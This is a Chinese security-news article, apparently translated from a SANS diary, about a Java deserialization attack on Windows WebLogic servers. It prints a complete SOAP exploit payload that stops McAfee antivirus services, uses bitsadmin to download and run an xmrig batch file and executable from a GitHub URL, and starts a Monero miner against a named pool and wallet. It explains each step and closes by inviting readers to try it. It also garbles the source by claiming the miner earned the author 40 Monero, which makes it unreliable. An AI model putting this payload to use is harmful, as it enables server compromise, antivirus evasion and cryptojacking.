![a.png](https://image.3001.net/images/20180410/15232964319019.png!small)  

**最近，安全社区中有很多人都在讨论如何利用Java反序列化漏洞来攻击类似Apache、SOLR和WebLogic之类的系统。不说废话，我们直接进入正题。目前绝大多数的此类攻击针对的都是Linux/Unix系统，但是我近期发现了一种针对Windows系统的攻击方法。**

 **PS：本文仅用于技术讨论与分享，严禁用于非法用途**

 **攻击代码如下：**

    
    
    <soapenv:Envelopexmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContextxmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <objectclass="java.lang.ProcessBuilder">
              <arrayclass="java.lang.String" length="3" >
                <void index="0">
                  <string>cmd</string>
                </void>
                <void index="1">
                  <string>/c</string>
                </void>
                <void index="2">
                  <string>net stop"McAfee McShield;net stop mcafeeframework;bitsadmin.exe /transfer"xmrig.bat" /download /priority foregroundhttp://raw.githubusercontent.com/sirikun/starships/master/xmrig.bat"%cd%\xmrig.bat";bitsadmin.exe /transfer "xmrig.exe"/download /priority foregroundhttp://raw.githubusercontent.com/sirikun/starships/master/xmrig.exe"%cd%\xmrig.exe;dir xmrig*;xmrig.bat;tasklist;</string>
                </void>
              </array>
              <voidmethod="start"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    
      
    

## 实际的Payload分析

关闭McAfee反病毒软件（我不明白社区中的这种技术为啥只关掉McAfee…）：  

    
    
    netstop "McAfee McShield;
    netstop mcafeeframework;

使用bitsadmin从GitHub下载加密货币挖矿程序和一个batch脚本文件：

    
    
    bitsadmin.exe/transfer "xmrig.bat" /download /priority foregroundhttp://raw.githubusercontent.com/sirikun/starships/master/xmrig.bat"%cd%\xmrig.bat";
    bitsadmin.exe/transfer "xmrig.exe" /download /priority foreground http://raw.githubusercontent.com/sirikun/starships/master/xmrig.exe"%cd%\xmrig.exe;
    dirxmrig*;
    xmrig.bat;
    tasklist;

Batch脚本文件代码如下：

    
    
    taskkill/im /f xmrig.exe /t
    netstop "McAfee McShield"
    netstop mcafeeframework
    xmrig.exe-o monerohash.com:3333 -u 42jF56tc85UTZwhMQc6rHbMHTxHqK74qS2zqLyRZxLbwegsy7FJ9w4T5B69Ay5qeMEMuvVDwHNeopAxrEZkkHrMb5phovJ6-p x --background --max-cpu-usage=50 --donate-level=1

首先，上述代码会终止其他xmrig进程（可能是为了防止资源竞争）。接下来，它会关闭McAfee。然后便会开启挖矿程序，并跟monerohash.com矿池（端口3333）进行连接。它只会占用大约50%的CPU资源，估计是为了避免被检测到吧。

目前为止，这个挖矿程序的计算能力只能实现350哈希每秒，并为我挖到了40个门罗币（价值约为7000美元）。

感兴趣的同学可以自己动手试一试，说不定会有一些意想不到的收获。

 ***
参考来源：[sans](https://isc.sans.edu/forums/diary/Java+Deserialization+Attack+Against+Windows/23513/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

